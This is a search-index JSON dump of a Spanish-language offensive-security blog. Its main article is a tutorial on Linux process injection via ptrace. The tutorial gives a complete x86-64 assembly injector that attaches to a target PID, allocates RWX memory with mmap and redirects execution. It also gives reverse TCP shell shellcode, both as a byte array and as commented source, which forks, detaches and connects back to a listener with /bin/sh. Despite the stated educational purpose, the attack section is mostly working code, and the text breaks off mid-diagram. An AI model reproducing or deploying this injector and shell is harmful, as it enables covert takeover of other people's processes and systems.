{"config":{"lang":["es"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"RAZOR","text":"Offensive Security Research <p>       Notas t\u00e9cnicas sobre seguridad ofensiva y desarrollo de malware en Linux.     </p> <p>       \u26a0\ufe0f Todo el contenido es exclusivamente con fines educativos y de investigaci\u00f3n.     </p> Malware Dev"},{"location":"#secciones","title":"Secciones","text":"Malware Development Shellcode, process injection, t\u00e9cnicas ofensivas Low-level"},{"location":"#ultimos-posts","title":"\u00daltimos posts","text":"Process Injection via Ptrace Inyecci\u00f3n de c\u00f3digo en procesos Linux usando ptrace en ASM puro Assembly 15 min Shellcode Basics Desarrollo de shellcode x86-64 para Linux Assembly 8 min"},{"location":"research/malware-dev/","title":"Malware Development","text":"<p>Disclaimer</p> <p>Este contenido es exclusivamente para fines educativos y de investigaci\u00f3n en entornos autorizados.</p>"},{"location":"research/malware-dev/#articulos","title":"Art\u00edculos","text":"Assembly Shellcode Basics Fundamentos de desarrollo de shellcode x86-64 Assembly Process Injection via Ptrace Inyecci\u00f3n de c\u00f3digo en procesos Linux usando ptrace puro"},{"location":"research/malware-dev/ptrace-injection/","title":"Process Injection via Ptrace - Just ASM","text":"<p>Inyecci\u00f3n de c\u00f3digo en procesos Linux usando ptrace, implementado completamente en ensamblador x86-64. Sin dependencias externas, sin libc, solo syscalls puras.</p>"},{"location":"research/malware-dev/ptrace-injection/#introduccion","title":"Introducci\u00f3n","text":"<p>La t\u00e9cnica de Process Injection via Ptrace permite a un proceso (el tracer) tomar control de otro proceso en ejecuci\u00f3n (el tracee) para inyectar y ejecutar c\u00f3digo arbitrario en su espacio de direcciones. Esta t\u00e9cnica es ampliamente utilizada en:</p> <ul> <li>Depuradores (GDB, LLDB)</li> <li>Herramientas de instrumentaci\u00f3n (strace, ltrace)</li> <li>Malware y rootkits</li> <li>T\u00e9cnicas de evasi\u00f3n de seguridad</li> </ul> <p>La syscall <code>ptrace</code> es el mecanismo que provee Linux para permitir que un proceso observe y controle la ejecuci\u00f3n de otro proceso, examinar y modificar su memoria y registros.</p>"},{"location":"research/malware-dev/ptrace-injection/#arquitectura-de-la-tecnica","title":"Arquitectura de la t\u00e9cnica","text":"<p>El flujo completo de la inyecci\u00f3n consta de las siguientes fases:</p>"},{"location":"research/malware-dev/ptrace-injection/#fase-1-adjuntar-al-proceso-victima","title":"Fase 1: Adjuntar al proceso v\u00edctima","text":"<p>Usamos <code>PTRACE_ATTACH</code> para conectarnos al proceso objetivo. Esto env\u00eda una se\u00f1al <code>SIGSTOP</code> al tracee, deteniendo su ejecuci\u00f3n. Debemos esperar con <code>wait4</code> hasta que el proceso est\u00e9 efectivamente detenido.</p>"},{"location":"research/malware-dev/ptrace-injection/#fase-2-preservar-el-estado-original","title":"Fase 2: Preservar el estado original","text":"<p>Con <code>PTRACE_GETREGS</code> obtenemos todos los registros del CPU del proceso v\u00edctima. Esto incluye el RIP (instruction pointer), que nos dice exactamente d\u00f3nde se detuvo la ejecuci\u00f3n. Guardamos una copia completa para restaurarla despu\u00e9s.</p>"},{"location":"research/malware-dev/ptrace-injection/#fase-3-inyectar-instruccion-syscall","title":"Fase 3: Inyectar instrucci\u00f3n syscall","text":"<p>Necesitamos que el proceso v\u00edctima ejecute una syscall <code>mmap</code> para reservar memoria. Para esto:</p> <ol> <li>Leemos los bytes donde apunta el RIP actual (<code>PTRACE_PEEKDATA</code>)</li> <li>Guardamos esos bytes originales</li> <li>Sobrescribimos con la instrucci\u00f3n <code>syscall</code> (0x0F 0x05) usando <code>PTRACE_POKEDATA</code></li> </ol>"},{"location":"research/malware-dev/ptrace-injection/#fase-4-ejecutar-mmap-en-el-contexto-victima","title":"Fase 4: Ejecutar mmap en el contexto v\u00edctima","text":"<p>Configuramos los registros para que cuando se ejecute la instrucci\u00f3n <code>syscall</code>, se invoque <code>mmap</code> con los argumentos correctos:</p> <ul> <li>RAX = 9 (n\u00famero de syscall mmap)</li> <li>RDI = 0 (direcci\u00f3n NULL, el kernel elige)</li> <li>RSI = 4096 (tama\u00f1o de p\u00e1gina)</li> <li>RDX = 7 (PROT_READ | PROT_WRITE | PROT_EXEC)</li> <li>R10 = 34 (MAP_PRIVATE | MAP_ANONYMOUS)</li> <li>R8 = -1 (sin file descriptor)</li> <li>R9 = 0 (offset)</li> </ul> <p>Usamos <code>PTRACE_SINGLESTEP</code> para ejecutar una sola instrucci\u00f3n y obtener el resultado de mmap en RAX.</p>"},{"location":"research/malware-dev/ptrace-injection/#fase-5-restaurar-estado-original","title":"Fase 5: Restaurar estado original","text":"<p>Restauramos los bytes originales donde estaba el RIP y los registros originales del proceso.</p>"},{"location":"research/malware-dev/ptrace-injection/#fase-6-inyectar-shellcode","title":"Fase 6: Inyectar shellcode","text":"<p>Escribimos nuestro shellcode byte a byte en la memoria RWX que acabamos de reservar con mmap.</p>"},{"location":"research/malware-dev/ptrace-injection/#fase-7-redirigir-ejecucion","title":"Fase 7: Redirigir ejecuci\u00f3n","text":"<p>Modificamos el RIP para que apunte al inicio de nuestro shellcode y soltamos el proceso con <code>PTRACE_DETACH</code>.</p>"},{"location":"research/malware-dev/ptrace-injection/#estructura-user_regs_struct","title":"Estructura user_regs_struct","text":"<p>En x86-64 Linux, la estructura <code>user_regs_struct</code> contiene todos los registros del CPU. El layout es el siguiente:</p> Offset Registro Descripci\u00f3n 0x00 r15 Registro de prop\u00f3sito general 0x08 r14 Registro de prop\u00f3sito general 0x10 r13 Registro de prop\u00f3sito general 0x18 r12 Registro de prop\u00f3sito general 0x20 rbp Base pointer 0x28 rbx Registro de prop\u00f3sito general 0x30 r11 Clobbered por syscall 0x38 r10 4to argumento syscall 0x40 r9 6to argumento syscall 0x48 r8 5to argumento syscall 0x50 rax N\u00famero de syscall / valor de retorno 0x58 rcx Clobbered por syscall 0x60 rdx 3er argumento syscall 0x68 rsi 2do argumento syscall 0x70 rdi 1er argumento syscall 0x78 orig_rax N\u00famero original de syscall 0x80 rip Instruction pointer 0x88 cs Code segment 0x90 eflags Flags del CPU 0x98 rsp Stack pointer 0xA0 ss Stack segment 0xA8 fs_base Base del segmento FS 0xB0 gs_base Base del segmento GS 0xB8 ds Data segment 0xC0 es Extra segment 0xC8 fs FS segment 0xD0 gs GS segment <p>La estructura tiene un tama\u00f1o total de 27 qwords (216 bytes).</p>"},{"location":"research/malware-dev/ptrace-injection/#consideraciones-sobre-little-endian","title":"Consideraciones sobre Little-Endian","text":"<p>x86-64 usa little-endian, lo que significa que el byte menos significativo (LSB) se almacena primero en memoria. Esto es crucial al trabajar con valores en memoria:</p> <pre><code>Valor en registro: 0x00007ffe6f9001b0\n\nDescomposici\u00f3n:\n  0x 00 00 7f fe 6f 90 01 b0\n     \u25b2                    \u25b2\n     \u2502                    \u2502\n    MSB                 LSB\n   (m\u00e1s significativo) (menos significativo)\n\n\nEn memoria (little-endian, LSB primero):\n\nRIP \u2192 0x7f7a85496687:  \u250c\u2500\u2500\u2500\u2500\u2510\n                       \u2502 b0 \u2502 \u2190 Primer byte en memoria\n      0x7f7a85496688:  \u251c\u2500\u2500\u2500\u2500\u2524\n                       \u2502 01 \u2502\n      0x7f7a85496689:  \u251c\u2500\u2500\u2500\u2500\u2524\n                       \u2502 90 \u2502\n      0x7f7a8549668a:  \u251c\u2500\u2500\u2500\u2500\u2524\n                       \u2502 6f \u2502\n      0x7f7a8549668b:  \u251c\u2500\u2500\u2500\u2500\u2524\n                       \u2502 fe \u2502\n      0x7f7a8549668c:  \u251c\u2500\u2500\u2500\u2500\u2524\n                       \u2502 7f \u2502\n      0x7f7a8549668d:  \u251c\u2500\u2500\u2500\u2500\u2524\n                       \u2502 00 \u2502\n      0x7f7a8549668e:  \u251c\u2500\u2500\u2500\u2500\u2524\n                       \u2502 00 \u2502\n                       \u2514\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Por esto, cuando inyectamos la instrucci\u00f3n <code>syscall</code> (bytes <code>0x0F 0x05</code>), debemos usar el valor <code>0x050F</code> en little-endian para que se almacene correctamente como <code>0F 05</code> en memoria.</p>"},{"location":"research/malware-dev/ptrace-injection/#inyector-principal-proc_injasm","title":"Inyector Principal (proc_inj.asm)","text":"<p>Este es el programa inyector completo. Lee atentamente los comentarios que explican cada paso:</p> <pre><code>section .data\nshellcode:\n    db 0xb8, 0x39, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48\n    db 0x83, 0xf8, 0x00, 0x74, 0x11, 0x4c, 0x8d, 0x1d\n    db 0xec, 0xff, 0xff, 0xff, 0x4d, 0x8b, 0xb3, 0xf8\n    db 0x0f, 0x00, 0x00, 0x41, 0xff, 0xe6, 0xb8, 0x70\n    db 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x29, 0x00\n    db 0x00, 0x00, 0xbf, 0x02, 0x00, 0x00, 0x00, 0xbe\n    db 0x01, 0x00, 0x00, 0x00, 0x48, 0x31, 0xd2, 0x0f\n    db 0x05, 0x49, 0x89, 0xc0, 0xb8, 0x2a, 0x00, 0x00\n    db 0x00, 0x4c, 0x89, 0xc7, 0x4d, 0x31, 0xc9, 0x41\n    db 0x51, 0x49, 0xba, 0x02, 0x00, 0x11, 0x5c, 0x7f\n    db 0x00, 0x00, 0x01, 0x41, 0x52, 0x48, 0x89, 0xe6\n    db 0xba, 0x10, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48\n    db 0x31, 0xf6, 0xb8, 0x21, 0x00, 0x00, 0x00, 0x4c\n    db 0x89, 0xc7, 0x0f, 0x05, 0x48, 0xff, 0xc6, 0x48\n    db 0x83, 0xfe, 0x03, 0x7c, 0xed, 0xb8, 0x3b, 0x00\n    db 0x00, 0x00, 0x6a, 0x00, 0x49, 0xbc, 0x2f, 0x62\n    db 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x41, 0x54\n    db 0x48, 0x89, 0xe7, 0x6a, 0x00, 0x48, 0x89, 0xe6\n    db 0x6a, 0x00, 0x48, 0x89, 0xe2, 0x0f, 0x05, 0xb8\n    db 0x3c, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x0f\n    db 0x05, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90\nsc_len equ $ - shellcode\n\nsection .bss\n    regs resq 27  ; sizeof(user_regs_struct) en x86_64  (27x8 bytes)\n    regs_ori resq 27\n    regs_sys resq 27 \n\n\nsection .text\nglobal _start\n_start:\n\n    ; PID\n    mov r15, 26559\n\n\n; 1 Attach y detenci\u00f3n del proceso:\n\n    ; PTRACE_ATTACH\n    mov rax, 101\n    mov rdi, 16          ; PTRACE_ATTACH (0x10)\n    mov rsi, r15         ; PID\n    xor rdx,rdx          ; addr\n    xor r10, r10         ; data\n    syscall\n\n\n    ; WAIT4: \n        ; Cuando se hace PTRACE_ATTACH, el kernel env\u00eda SIGSTOP al proceso objetivo. \n        ; Es necesario llamar a wait4 para bloquear al tracer hasta que el proceso tracee  \n        ; est\u00e9 efectivamente detenido antes de poder manipularlo.\n\n        mov rax, 61\n        mov rdi, r15            ; PID a esperar (-1 para cualquier hijo)\n        sub rsp, 8\n        mov rsi, rsp            ; &amp;status\n        xor rdx, rdx            ; options\n        xor r10, r10            ; rusage\n        syscall\n\n; -----------------------------------------\n\n; 2 Preservaci\u00f3n del contexto de ejecuci\u00f3n\n\n    ; PTRACE_GETREGS\n    mov rax, 101\n    mov rdi, 12   ; PTRACE_GETREGS\n    mov rsi, r15  ; PID\n    xor rdx, rdx  ; addr\n    lea r10, [rel regs] ; puntero al buffer donde se va almacenar la estructura de registros\n    syscall\n\n    ; En este punto, regs contiene:\n    ; 0x00  r15\n    ; 0x08  r14\n    ; 0x10  r13\n    ; 0x18  r12\n    ; 0x20  rbp\n    ; 0x28  rbx\n    ; 0x30  r11\n    ; 0x38  r10\n    ; 0x40  r9\n    ; 0x48  r8\n    ; 0x50  rax\n    ; 0x58  rcx\n    ; 0x60  rdx\n    ; 0x68  rsi\n    ; 0x70  rdi\n    ; 0x78  orig_rax\n    ; 0x80  rip\n    ; 0x88  cs\n    ; 0x90  eflags\n    ; 0x98  rsp\n    ; 0xA0  ss\n    ; 0xA8  fs_base\n    ; 0xB0  gs_base\n    ; 0xB8  ds\n    ; 0xC0  es\n    ; 0xC8  fs\n    ; 0xD0  gs\n\n    ; Copia de los registros originales del traceee en el buffer de backup\n    lea rsi, [rel regs]       ; RSI se usa como puntero de origen y va avanzando\n    lea rdi, [rel regs_ori]   ; RDI se usa como puntero destino y va avanzando\n\n    mov rcx, 27               ; RCX se usa como contador y se va decrementando hasta 0\n    cld                       ; DF=0 (direcci\u00f3n de copia ascendente)\n    rep movsq                 ; mueve RCX qwords: [RSI] -&gt; [RDI]\n\n                    ; movsq copia un qword (8 bytes) desde la direcci\u00f3n apuntada por RSI hacia la direcci\u00f3n apuntada por RDI   \n                    ; rep repite esa operaci\u00f3n RCX veces\n\n; -----------------------------------------\n\n\n; 3 Inyecci\u00f3n de la instrucci\u00f3n syscall (0x0f 0x05)\n\n\n    mov r12, [regs+0x80]   ; Contenido del RIP del proceso tracee (direcci\u00f3n de la pr\u00f3xima instrucci\u00f3n a ejecutar)\n\n    ; PTRACE_PEEKDATA (leer memoria) Se leen 8 bytes a partir de la direcci\u00f3n actual a la que apunta el RIP del proceso tracee\n    mov rax, 101\n    mov rdi, 2       ; PTRACE_PEEKDATA\n    mov rsi, r15     ; PID\n    mov rdx, r12     ; addr\n    sub rsp, 8       ; 8 bytes\n    mov r10, rsp     ; puntero a data (direccion donde se almacenar\u00e1 la info le\u00edda)\n    syscall \n\n    mov r11, [rsp] ; En r11 y en el tope del stack se encuentra el valor al que apunta RIP del tracee\n    mov r13, r11 ; Backup del valor original\n    and r11, 0xFFFFFFFFFFFF0000 ; limpiar los 2 bytes bajos\n    or r11, 0x000000000000050F  ; insertar syscall (0x0f 0x05 en little-endian)\n\n    ; PTRACE_POKEDATA (escribir en memoria)\n    mov rax, 101\n    mov rdi, 5     ; PTRACE_POKEDATA\n    mov rsi, r15   ; PID\n    mov rdx, r12   ; addr \n    mov r10, r11   ; valor de 8 bytes a escribir\n    syscall\n\n\n; -----------------------------------------\n\n\n; 4 Configuraci\u00f3n de registros para MMAP\n\n\n    ; MMAP\n\n        mov qword [regs+0x50], 9       ; (RAX) Se sustituye todo el valor del registro       N\u00famero de syscall para mmap\n        mov qword [regs+0x70],0        ; (RDI)       rdi = addr = 0 (NULL) \u2192 Pide al kernel que elija la direcci\u00f3n\n        mov qword [regs+0x68],4096     ; (RSI)    rsi = length = 4096 bytes (1 p\u00e1gina t\u00edpica)\n        mov qword [regs+0x60],7        ; (RDX)       rdx = prot = 7 =&gt; PROT_READ(1) | PROT_WRITE(2) | PROT_EXEC(4)\n        mov qword [regs+0x38],34       ; (R10)      r10 = flags = 34 =&gt; MAP_PRIVATE(0x2) | MAP_ANONYMOUS(0x20)\n        mov qword [regs+0x48],-1       ; (R8)       r8 = fd = -1 (usado con MAP_ANONYMOUS; -1 indica \"no file\")\n        mov qword [regs+0x40],0        ; (R9)        r9 = offset = 0 (desplazamiento en el fd; irrelevante con ANONYMOUS)\n\n    ; PTRACE_SETREGS\n        mov rax, 101\n        mov rdi, 13    ; PTRACE_SETREGS\n        mov rsi, r15   ; PID\n        xor rdx, rdx   ; addr\n        lea r10, [rel regs] ; puntero al buffer donde se encuentra la estructura de registros\n        syscall\n\n\n; -----------------------------------------\n\n\n; 5 Ejecuci\u00f3n controlada de la syscall MMAP\n\n    ;PTRACE_SINGLESTEP\n    mov rax, 101\n    mov rdi, 9       ; PTRACE_SINGLESTEP\n    mov rsi, r15     ; PID\n    xor rdx, rdx     ; addr\n    xor r10, r10     ; data\n    syscall\n\n    ; WAIT4: \n    mov rax, 61\n    mov rdi, r15            ; PID a esperar (-1 para cualquier hijo)\n    sub rsp, 8\n    mov rsi, rsp            ; &amp;status\n    xor rdx, rdx            ; options\n    xor r10, r10            ; rusage\n    syscall\n\n    ; PTRACE_GETREGS\n    mov rax, 101\n    mov rdi, 12   ; PTRACE_GETREGS\n    mov rsi, r15  ; PID\n    xor rdx, rdx  ; addr\n    lea r10, [rel regs_sys] ; puntero al buffer donde se va almacenar la estructura de registros\n    syscall\n\n\n; -----------------------------------------\n\n\n; 6 Obtenci\u00f3n del resultado de la syscall MMAP\n\n\n    xor r12, r12 \n    mov r12, [regs_sys+0x50]       ; (RAX) direcci\u00f3n donde comienza la zona de memoria reservada com permisos RWX\n\n\n; -----------------------------------------\n\n; 7 Restauraci\u00f3n del contenido ubicado en la direcci\u00f3n a la que apunta el registro RIP del tracee\n\n        xor r14, r14\n        mov r14, [regs_ori+0x80]\n\n        ; PTRACE_POKEDATA (escribir en memoria)\n        mov rax, 101\n        mov rdi, 5     ; PTRACE_POKEDATA\n        mov rsi, r15   ; PID\n        mov rdx, r14   ; addr \n        mov r10, r13   ; valor de 8 bytes a escribir\n        syscall\n\n        ; Comprobaci\u00f3n de que se haya restaurado el bytearray de manera adecuada\n        ; PTRACE_PEEKDATA (leer memoria)\n        ;mov rax, 101\n        ;mov rdi, 2       ; PTRACE_PEEKDATA\n        ;mov rsi, r15     ; PID\n        ;mov rdx, r14     ; addr\n        ;sub rsp, 8\n        ;mov r10, rsp     ; puntero a data (direccion donde se almacenar\u00e1 la info le\u00edda)\n        ;syscall \n\n; -----------------------------------------\n\n\n; 8 Restauraci\u00f3n de los registros originales del proceso tracee\n\n\n\n        ; PTRACE_SETREGS\n        mov rax, 101\n        mov rdi, 13    ; PTRACE_SETREGS\n        mov rsi, r15   ; PID\n        xor rdx, rdx   ; addr\n        lea r10, [rel regs_ori] ; puntero al buffer donde se encuentra la estructura de registros\n        syscall\n\n\n\n; -----------------------------------------\n\n; 9 Almacenamiento del RIP de retorno en los \u00faltimos 8 bytes de la regi\u00f3n de memoria reservada por MMAP\n\n\n        ; PTRACE_POKEDATA (escribir en memoria)\n        mov rax, 101\n        mov rdi, 5     ; PTRACE_POKEDATA\n        mov rsi, r15   ; PID\n        lea rdx, [r12+4088]   ; addr \n        mov r10, r14   ; valor de 8 bytes a escribir\n        syscall\n\n        ; Verificar que se ha escrito el valor del RIP de retorno en la regi\u00f3n de memoria reservada por MMAP\n\n        ; PTRACE_PEEKDATA\n        ;mov rax, 101\n        ;mov rdi, 2       ; PTRACE_PEEKDATA\n        ;mov rsi, r15     ; PID\n        ;lea rdx, [r12+4088]     ; addr\n        ;sub rsp, 8       ; 8 bytes\n        ;mov r10, rsp     ; puntero a data (direccion donde se almacenar\u00e1 la info le\u00edda)\n        ;syscall \n\n\n\n; -----------------------------------------\n\n; 10 Inyecci\u00f3n del shellcode en la zona de memoria reservada\n\n    xor r13,r13\n    lea r13, [rel shellcode]   ; puntero al shellcode\n    xor r14, r14\n    mov r14, sc_len / 8        ; contador de palabras a escribir\n    push r12\n\n    .loop_inj:\n\n        cmp r14, 0     ; compara el contador de palabras a escribir con 0\n        jz .done       ; si contador == 0, saltar a .done\n\n        ; PTRACE_POKEDATA\n        mov rax, 101\n        mov rdi, 5     ; PTRACE_POKEDATA\n        mov rsi, r15   ; PID\n        mov rdx, r12   ; addr \n        mov r10, [r13] ; valor de 8 bytes a escribir\n        syscall\n\n        add r12, 8\n        add r13, 8\n        dec r14\n        jmp .loop_inj\n\n\n; -----------------------------------------\n\n    .done\n\n        ; Verificar que el shellcode se escribi\u00f3 bien\n        ;mov rax, 101\n        ;mov rdi, 2          ; PTRACE_PEEKDATA\n        ;mov rsi, r15\n        ;mov rdx, r12        ; direcci\u00f3n mmap\n        ;sub rsp, 8       ; 8 bytes\n        ;mov r10, rsp     ; puntero a data (direccion donde se almacenar\u00e1 la info le\u00edda)\n        ;syscall \n\n        pop r12\n\n        mov qword [regs_ori+0x80], r12   ; RIP == direcci\u00f3n del inicio de la memoria reservada == inicio del shellcode\n        mov qword [regs_ori+0x78], -1    ; orig_rax = -1 (evita syscall restart)\n\n\n        ; PTRACE_SETREGS\n        mov rax, 101\n        mov rdi, 13    ; PTRACE_SETREGS\n        mov rsi, r15   ; PID\n        xor rdx, rdx   ; addr\n        lea r10, [rel regs_ori] ; puntero al buffer donde se encuentra la estructura de registros\n        syscall\n\n\n\n    ; PTRACE_DETACH\n    mov rax, 101\n    mov rdi, 17    ; PTRACE_DETACH\n    mov rsi, r15   ; PID\n    xor rdx, rdx   ; addr\n    xor r10, r10   ; signal = 0 (no enviar se\u00f1al)\n    syscall\n\n\n    ; EXIT\n    mov rax, 60\n    xor rdi,rdi \n    syscall\n\n\n\n;Explicar fork, setsid y munmap\n</code></pre>"},{"location":"research/malware-dev/ptrace-injection/#shellcode-reverse-tcp-shell-proc_inj_rev_tcpasm","title":"Shellcode: Reverse TCP Shell (proc_inj_rev_tcp.asm)","text":"<p>Este es el shellcode que se inyecta en el proceso v\u00edctima. Su dise\u00f1o es especialmente interesante porque:</p> <ol> <li>Usa <code>fork()</code> para crear un proceso hijo que manejar\u00e1 la conexi\u00f3n reversa</li> <li>El proceso padre retorna a la ejecuci\u00f3n normal del programa v\u00edctima</li> <li>El hijo llama a <code>setsid()</code> para desvincularse de la terminal y crear una nueva sesi\u00f3n</li> <li>Establece una conexi\u00f3n TCP al atacante y redirige stdin/stdout/stderr al socket</li> </ol>"},{"location":"research/malware-dev/ptrace-injection/#por-que-fork","title":"\u00bfPor qu\u00e9 fork?","text":"<p>Si el shellcode ejecutara directamente la reverse shell sin hacer fork, el proceso v\u00edctima quedar\u00eda \"secuestrado\" ejecutando <code>/bin/sh</code>. Al hacer fork:</p> <ul> <li>El proceso padre (PID original de la v\u00edctima) recupera el RIP de retorno almacenado al final de la regi\u00f3n mmap y contin\u00faa su ejecuci\u00f3n normal</li> <li>El proceso hijo ejecuta la reverse shell de forma independiente</li> </ul>"},{"location":"research/malware-dev/ptrace-injection/#por-que-setsid","title":"\u00bfPor qu\u00e9 setsid?","text":"<p><code>setsid()</code> crea una nueva sesi\u00f3n y hace que el proceso hijo sea el l\u00edder de esa sesi\u00f3n. Esto lo desvincula de cualquier terminal controladora, evitando que se\u00f1ales como SIGHUP afecten a la shell reversa.</p>"},{"location":"research/malware-dev/ptrace-injection/#estructura-de-sockaddr_in","title":"Estructura de sockaddr_in","text":"<p>La estructura para la conexi\u00f3n TCP se construye en el stack:</p> <pre><code>Entrada esperada: 02 00 11 5c 7F 00 00 01 00 00 00 00 00 00 00 00   \n                  \u2514\u2500\u2500\u2518  \u2514\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                  0-1   2-3   4-7         8-15         (16 bytes en total)\n                  fam   port  IP          padding\n\nBytes 0-1:   02 00           \u2192 sin_family (AF_INET = 2)\nBytes 2-3:   11 5c           \u2192 sin_port (4444 en network byte order)\nBytes 4-7:   7F 00 00 01     \u2192 sin_addr (127.0.0.1)\nBytes 8-15:  00 00 00 00...  \u2192 sin_zero (padding)\n</code></pre> <pre><code>section .text\nglobal _start\n_start:\n\n\n    ; FORK\n    mov rax, 57\n    syscall\n\n    cmp rax, 0           ; si rax==0 se trata del hijo\n    jz .child            \n\n                            ; r11 porque es un registro clobbered (destruido por las syscalls)\n                                ; por tanto, no se est\u00e1 modificando un registro funcional del proceso tracee\n    lea r11, [rel _start] ; r11 = direcci\u00f3n de _start = mmap_base = RIP inicial del shellcode\n\n\n                            ; Nunca se debe asignar un valor a R11 antes de un syscall si se pretende recuperar despu\u00e9s\n\n    ; Proceso Padre\n    mov r14, [r11+4088] ; Obtiene direcci\u00f3n de retorno\n    jmp r14             ; Salta a la direcci\u00f3n de retorno sobreescribiendo el registro RIP\n\n\n.child\n\n\n    ; SETSID\n    mov rax, 112\n    syscall\n\n\n    ; SOCKET\n    mov rax, 41\n    mov rdi, 2 ;IPV4\n    mov rsi, 1 ;TCP\n    xor rdx, rdx ; Default\n    syscall\n\n    ; Store socket FD\n    mov r8, rax\n\n    ; CONNECT\n    mov rax, 42\n    mov rdi, r8\n                    ;   Stack        Low  &lt;----------- High\n    ; Entrada esperada: 02 00 11 5c C0 A8 12 8D 00 00 00 00 00 00 00 00   \n    ;                   \u2514\u2500\u2500\u2518  \u2514\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n    ;                   0-1   2-3   4-7         8-15         (16 bytes en total)\n    ;                   fam   port  IP          padding\n\n    ; Mapeado de los campos de sockaddr_in:\n                        ; Bytes 0-1:   02 00           \u2192 sin_family (AF_INET = 2)\n                        ; Bytes 2-3:   11 5c           \u2192 sin_port (4444)\n                        ; Bytes 4-7:   7F 00 00 01     \u2192 sin_addr (127.0.0.1)\n                        ; Bytes 8-15:  00 00 00 00...  \u2192 sin_zero (padding)\n    xor r9,r9 ; 0\n    push r9 ; 64 bits de padding a 0 (sin_zero)(8 bytes)\n    mov r10, 0x0100007F5c110002\n    push r10 ; sin_family + sin_port + sin_addr (8 bytes)\n    mov rsi, rsp ; direccion del tope de la pila\n    mov rdx, 16 ;IPV4 (espera 16 bytes)\n    syscall\n\n\n    xor rsi,rsi\n.dup2:                        ; stdin(0), stdout(1), stderr(2) redirigidos al socket\n    ;DUP2\n    mov rax, 33\n    mov rdi, r8\n    syscall \n    inc rsi\n    cmp rsi, 3\n    jl .dup2\n\n    ; EXEXCVE\n    mov rax, 59\n\n    push 0                       ; null terminator de /bin/sh -&gt; /bin/sh\\0\n    mov r12, 0x68732f6e69622f    ; /bin/sh (2F 62 69 6E 2F 73 68) en little-endian\n    push r12                     ; string /bin/sh\n    mov rdi, rsp\n\n    push 0                       ; argv = {NULL}\n    mov rsi, rsp\n\n    push 0                       ; envp = {NULL}\n    mov rdx, rsp\n\n    syscall \n\n.done:\n    ; EXIT\n    mov rax, 60                    ; syscall: exit\n    xor rdi, rdi                   ; exit code = 0 (\u00e9xito)\n    syscall                        \n</code></pre>"},{"location":"research/malware-dev/ptrace-injection/#diagrama-de-memoria-post-inyeccion","title":"Diagrama de memoria post-inyecci\u00f3n","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                    PROCESO V\u00cdCTIMA                          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                             \u2502\n\u2502  C\u00f3digo original del proceso                                \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u2502\n\u2502  \u2502 ...                                                 \u2502    \u2502\n\u2502  \u2502 [RIP original] \u2192 instrucci\u00f3n donde se detuvo        \u2502\u25c4\u2500\u2500\u2500\u2524 Restaurado\n\u2502  \u2502 ...                                                 \u2502    \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2502\n\u2502                                                             \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                             \u2502\n\u2502  MMAP Region (4096 bytes, RWX)                              \u2502\n\u2502  